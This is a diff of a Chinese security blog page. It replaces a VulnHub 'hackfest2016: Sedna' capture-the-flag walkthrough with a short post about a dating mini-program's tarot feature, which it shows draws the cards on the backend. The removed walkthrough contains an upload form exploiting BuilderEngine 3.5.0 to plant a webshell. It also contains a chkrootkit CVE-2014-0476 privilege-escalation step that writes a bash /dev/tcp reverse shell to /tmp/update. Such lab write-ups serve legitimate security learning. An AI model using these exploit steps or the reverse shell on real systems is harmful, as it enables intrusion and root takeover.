@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
   <title>
-    VulnHub hackfest2016：Sedna | 雾島风起時
+    恋人空间小程序塔罗牌解密 | 雾島风起時
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,30 +17,25 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="hackfest2016: Sedna项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hackfest2016&#x2F;Sedna.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  文件上传BuilderEngine 3.5.0扫描后台发现有个这个目录可以访问  访问过去是空白，查看页面源代码推测使用的框">
+    <meta name="description" content="恋人空间小程序塔罗牌解密前言本次测试不涉及任何漏洞 塔罗牌解密进入小程序点击 “爱情塔罗”  来到这个界面后抓包点击 “立即开始”  随便输入一个问题  在抽牌界面可以看到已经有一个包发出去了  这个包返回的就是用户抽的三个卡牌 你以为是你自己抽的，实际上是后端随机发的（&gt;_&lt;） 我们要做坚定的唯物主义者，伟大的共产主义战士！！！">
 <meta property="og:type" content="article">
-<meta property="og:title" content="VulnHub hackfest2016：Sedna">
-<meta property="og:url" content="http://example.com/2026/04/01/hackfest2016%20Sedna/index.html">
+<meta property="og:title" content="恋人空间小程序塔罗牌解密">
+<meta property="og:url" content="http://example.com/2026/05/11/%E6%81%8B%E4%BA%BA%E7%A9%BA%E9%97%B4%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%A1%94%E7%BD%97%E7%89%8C%E8%A7%A3%E5%AF%86/index.html">
 <meta property="og:site_name" content="雾島风起時">
-<meta property="og:description" content="hackfest2016: Sedna项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;hackfest2016&#x2F;Sedna.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  文件上传BuilderEngine 3.5.0扫描后台发现有个这个目录可以访问  访问过去是空白，查看页面源代码推测使用的框">
+<meta property="og:description" content="恋人空间小程序塔罗牌解密前言本次测试不涉及任何漏洞 塔罗牌解密进入小程序点击 “爱情塔罗”  来到这个界面后抓包点击 “立即开始”  随便输入一个问题  在抽牌界面可以看到已经有一个包发出去了  这个包返回的就是用户抽的三个卡牌 你以为是你自己抽的，实际上是后端随机发的（&gt;_&lt;） 我们要做坚定的唯物主义者，伟大的共产主义战士！！！">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c760774066a6014cf4c999.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c76816f2426dbb8ef9040d.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c76867f2426dbb8ef90431.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c76c2cf2426dbb8ef90580.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c77018f2426dbb8ef927be.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c770f4f2426dbb8ef927d0.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c7712bf2426dbb8ef927d6.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c7718cf2426dbb8ef927e4.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c7765cf2426dbb8ef928e2.png">
-<meta property="og:image" content="https://pic1.imgdb.cn/item/69c77d9cf2426dbb8ef956e6.png">
-<meta property="article:published_time" content="2026-04-01T08:37:00.000Z">
-<meta property="article:modified_time" content="2026-04-14T13:23:31.129Z">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a016d21514fff0f73775fd1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a016d4f514fff0f73775fdf.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a016d76514fff0f73775fe5.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a016d90514fff0f73775fe7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a016dc9514fff0f73775ff2.png">
+<meta property="article:published_time" content="2026-05-11T04:32:00.000Z">
+<meta property="article:modified_time" content="2026-05-11T05:50:35.906Z">
 <meta property="article:author" content="ALL">
-<meta property="article:tag" content="chkrootkit 检测工具（CVE-2014-0476）">
-<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="微信小程序">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic1.imgdb.cn/item/69c760774066a6014cf4c999.png">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6a016d21514fff0f73775fd1.png">
     <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -139,11 +134,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub hackfest2016：Sedna">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="恋人空间小程序塔罗牌解密">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">VulnHub hackfest2016：Sedna</h1>
+            <h1 data-aos="slide-up">恋人空间小程序塔罗牌解密</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -158,7 +153,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackfest2016-Sedna"><span class="toc-number">1.</span> <span class="toc-text">hackfest2016: Sedna</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BuilderEngine-3-5-0"><span class="toc-number">1.1.1.</span> <span class="toc-text">BuilderEngine 3.5.0</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chkrootkit-%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%88CVE-2014-0476%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">chkrootkit 检测工具（CVE-2014-0476）</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%81%8B%E4%BA%BA%E7%A9%BA%E9%97%B4%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%A1%94%E7%BD%97%E7%89%8C%E8%A7%A3%E5%AF%86"><span class="toc-number">1.</span> <span class="toc-text">恋人空间小程序塔罗牌解密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A1%94%E7%BD%97%E7%89%8C%E8%A7%A3%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">塔罗牌解密</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -230,13 +225,13 @@
   </div>
 </aside>
 
-          <section id="main" aria-label="Main content"><article id="post-hackfest2016 Sedna" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main" aria-label="Main content"><article id="post-恋人空间小程序塔罗牌解密" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-04-01T08:37:00.000Z" itemprop="datePublished">2026-04-01</time>
-    <time style="display: none;" id="post-update-time">2026-04-14</time>
+    <time datetime="2026-05-11T04:32:00.000Z" itemprop="datePublished">2026-05-11</time>
+    <time style="display: none;" id="post-update-time">2026-05-11</time>
   </span>
 </div>
 
@@ -245,69 +240,35 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="hackfest2016-Sedna"><a href="#hackfest2016-Sedna" class="headerlink" title="hackfest2016: Sedna"></a>hackfest2016: Sedna</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/hackfest2016/Sedna.ova">https://download.vulnhub.com/hackfest2016/Sedna.ova</a></p>
-<p>是一个打包好的镜像文件</p>
-<p><strong>注意：导入 vmx 时一定要选择我已移动，否则没网</strong></p>
-<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
-<p><img src="https://pic1.imgdb.cn/item/69c760774066a6014cf4c999.png"></p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="BuilderEngine-3-5-0"><a href="#BuilderEngine-3-5-0" class="headerlink" title="BuilderEngine 3.5.0"></a>BuilderEngine 3.5.0</h3><p>扫描后台发现有个这个目录可以访问</p>
-<p><img src="https://pic1.imgdb.cn/item/69c76816f2426dbb8ef9040d.png"></p>
-<p>访问过去是空白，查看页面源代码推测使用的框架</p>
-<p><img src="https://pic1.imgdb.cn/item/69c76867f2426dbb8ef90431.png"></p>
-<p>去 Exploit-DB 中找到历史 NDay</p>
-<p><img src="https://pic1.imgdb.cn/item/69c76c2cf2426dbb8ef90580.png"></p>
-<p>按照官网给出的路径访问过去</p>
-<p><img src="https://pic1.imgdb.cn/item/69c77018f2426dbb8ef927be.png"></p>
-<p>创建一个简单的 HTML 文件 <code>upload.html</code>，内容如下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.110.132/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files[]&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>上传我们的反弹 Shell</p>
-<p><img src="https://pic1.imgdb.cn/item/69c770f4f2426dbb8ef927d0.png"></p>
-<p>在 <code>/files</code> 路径中可以找到我们上传的 WebShell</p>
-<p><img src="https://pic1.imgdb.cn/item/69c7712bf2426dbb8ef927d6.png"></p>
-<p>成功连接上</p>
-<p><img src="https://pic1.imgdb.cn/item/69c7718cf2426dbb8ef927e4.png"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h3 id="chkrootkit-检测工具（CVE-2014-0476）"><a href="#chkrootkit-检测工具（CVE-2014-0476）" class="headerlink" title="chkrootkit 检测工具（CVE-2014-0476）"></a>chkrootkit 检测工具（CVE-2014-0476）</h3><p>发现 <code>/etc</code> 目录下有 chkrootkit 程序</p>
-<p>chkrootkit 是一个用来检测 rootkit 的安全工具，通常以 <strong>root 权限</strong> 运行</p>
-<p><img src="https://pic1.imgdb.cn/item/69c7765cf2426dbb8ef928e2.png"></p>
-<p>漏洞位于 chkrootkit 的 <code>slapper()</code> 函数中。这是一个用来检测 Slapper 蠕虫的函数，它会检查系统是否存在特定恶意文件。问题代码大致如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">slapper</span></span> ()&#123;</span><br><span class="line">   SLAPPER_FILES=<span class="string">&quot;... <span class="variable">$&#123;ROOTDIR&#125;</span>tmp/update ...&quot;</span>   <span class="comment"># 包含 /tmp/update 路径</span></span><br><span class="line">   file_port=</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;SLAPPER_FILES&#125;</span>; <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> [ -f <span class="variable">$&#123;i&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">         file_port=<span class="variable">$file_port</span> <span class="variable">$i</span>      <span class="comment"># ← 漏洞行！</span></span><br><span class="line">         STATUS=1</span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">   <span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>问题所在：第 <code>file_port=$file_port $i</code> 这一行，变量赋值缺少引号</p>
-<ul>
-<li>当 <code>file_port</code> 为空时，这一行实际执行的是 <code>$i</code></li>
-<li><code>$i</code> 是文件路径，例如 <code>/tmp/update</code></li>
-<li>这意味着：chkrootkit 会直接执行 <code>/tmp/update</code> 这个文件</li>
-</ul>
-<p>在 <code>/tmp</code> 目录下创建一个名为 <code>update</code> 的文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash</span></span><br><span class="line"><span class="string">bash -i &gt;&amp; /dev/tcp/192.168.110.128/445 0&gt;&amp;1&#x27;</span> &gt; /tmp/update</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/update</span><br></pre></td></tr></table></figure>
-
-<p>Kali 开启监听等着反弹就行了</p>
-<p><img src="https://pic1.imgdb.cn/item/69c77d9cf2426dbb8ef956e6.png"></p>
+        <h1 id="恋人空间小程序塔罗牌解密"><a href="#恋人空间小程序塔罗牌解密" class="headerlink" title="恋人空间小程序塔罗牌解密"></a>恋人空间小程序塔罗牌解密</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试不涉及任何漏洞</p>
+<h2 id="塔罗牌解密"><a href="#塔罗牌解密" class="headerlink" title="塔罗牌解密"></a>塔罗牌解密</h2><p>进入小程序点击 “爱情塔罗”</p>
+<p><img src="https://pic1.imgdb.cn/item/6a016d21514fff0f73775fd1.png"></p>
+<p>来到这个界面后抓包点击 “立即开始”</p>
+<p><img src="https://pic1.imgdb.cn/item/6a016d4f514fff0f73775fdf.png"></p>
+<p>随便输入一个问题</p>
+<p><img src="https://pic1.imgdb.cn/item/6a016d76514fff0f73775fe5.png"></p>
+<p>在抽牌界面可以看到已经有一个包发出去了</p>
+<p><img src="https://pic1.imgdb.cn/item/6a016d90514fff0f73775fe7.png"></p>
+<p>这个包返回的就是用户抽的三个卡牌</p>
+<p>你以为是你自己抽的，实际上是后端随机发的（&gt;_&lt;）</p>
+<p>我们要做坚定的唯物主义者，伟大的共产主义战士！！！</p>
+<p><img src="https://pic1.imgdb.cn/item/6a016dc9514fff0f73775ff2.png"></p>
 
     </div>
     <footer class="article-footer">
-        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+        <a class="article-category-link" href="/categories/SRC/" title="SRC" data-aos="zoom-in">SRC</a>
 
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/chkrootkit-%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%88CVE-2014-0476%EF%BC%89/" rel="tag" title="chkrootkit 检测工具（CVE-2014-0476）">chkrootkit 检测工具（CVE-2014-0476）</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag" title="文件上传">文件上传</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag" title="XSS">XSS</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/" rel="tag" title="微信小程序">微信小程序</a></li></ul>
 
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
-      <div class="article-nav-link-wrap left">
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub hackfest2016：Orcus" class="lazyload">
-        <a href="/2026/04/01/hackfest2016%20Orcus/" aria-label="前一篇: VulnHub hackfest2016：Orcus" title="前一篇: VulnHub hackfest2016：Orcus"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-            VulnHub hackfest2016：Orcus
-        </h3>
-      </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub DC416：2016-Fortress" class="lazyload">
-      <a href="/2026/04/01/DC416%202016-Fortress/" aria-label="后一篇: VulnHub DC416：2016-Fortress"  title="后一篇: VulnHub DC416：2016-Fortress"></a>
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Nood：1" class="lazyload">
+      <a href="/2026/05/10/Noob%201/" aria-label="后一篇: VulnHub Nood：1"  title="后一篇: VulnHub Nood：1"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
-          VulnHub DC416：2016-Fortress
+          VulnHub Nood：1
       </h3>
     </div>
   </nav>
@@ -359,7 +320,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hackfest2016-Sedna"><span class="toc-number">1.</span> <span class="toc-text">hackfest2016: Sedna</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BuilderEngine-3-5-0"><span class="toc-number">1.1.1.</span> <span class="toc-text">BuilderEngine 3.5.0</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chkrootkit-%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%88CVE-2014-0476%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">chkrootkit 检测工具（CVE-2014-0476）</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%81%8B%E4%BA%BA%E7%A9%BA%E9%97%B4%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%A1%94%E7%BD%97%E7%89%8C%E8%A7%A3%E5%AF%86"><span class="toc-number">1.</span> <span class="toc-text">恋人空间小程序塔罗牌解密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A1%94%E7%BD%97%E7%89%8C%E8%A7%A3%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">塔罗牌解密</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -487,13 +448,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "ALL",
-          title: "VulnHub hackfest2016：Sedna",
-          url: "http://example.com/2026/04/01/hackfest2016%20Sedna/",
+          title: "恋人空间小程序塔罗牌解密",
+          url: "http://example.com/2026/05/11/%E6%81%8B%E4%BA%BA%E7%A9%BA%E9%97%B4%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%A1%94%E7%BD%97%E7%89%8C%E8%A7%A3%E5%AF%86/",
           excerpt: "",
           description: "",
-          stripContent: "hackfest2016: Sedna项目地址：https://download.vulnhub.com/hackfest2016/Sedna.ova 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  文件上传BuilderEngine 3.5.0扫描后台发现有个这个目录可以访问  访问过去是空白，查看页面源代码推测使用的框架  去 Exploit-DB 中找到历史 NDay  按照官网给出的路径访问过去  创建一个简单的",
-          date: "Wed Apr 01 2026 16:37:00 GMT+0800",
-          updated: "Tue Apr 14 2026 21:23:31 GMT+0800",
+          stripContent: "恋人空间小程序塔罗牌解密前言本次测试不涉及任何漏洞 塔罗牌解密进入小程序点击 “爱情塔罗”  来到这个界面后抓包点击 “立即开始”  随便输入一个问题  在抽牌界面可以看到已经有一个包发出去了  这个包返回的就是用户抽的三个卡牌 你以为是你自己抽的，实际上是后端随机发的（&amp;gt;_&amp;lt;） 我们要做坚定的唯物主义者，伟大的共产主义战士！！！  ",
+          date: "Mon May 11 2026 12:32:00 GMT+0800",
+          updated: "Mon May 11 2026 13:50:35 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
